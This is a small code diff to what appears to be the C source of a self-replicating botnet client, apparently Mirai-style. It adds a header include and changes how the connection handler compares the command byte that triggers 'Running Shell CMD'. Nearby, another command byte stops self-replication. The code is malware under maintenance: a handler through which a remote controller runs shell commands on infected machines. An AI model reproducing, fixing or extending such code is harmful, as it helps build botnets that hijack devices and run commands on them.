@@ -13,6 +13,7 @@
 #include <fcntl.h>
 #include <sys/ioctl.h>
 #include <sys/poll.h>
+#include <sys/wait.h>
 #include <time.h>
 #include <errno.h>
 #include <string.h>
@@ -596,7 +597,7 @@ int main(int argc, char **args)
 					printf("[main/conn]: stopped selfrep from cmd 0xfe\r\n");
 					#endif
 				}
-				else if(*(rdbuf+2) == '\xFD')
+				else if(*(rdbuf+2) == 253)
 				{
 					#ifdef DEBUG
 					printf("[main/conn]: Running Shell CMD %s\r\n", rdbuf+1);
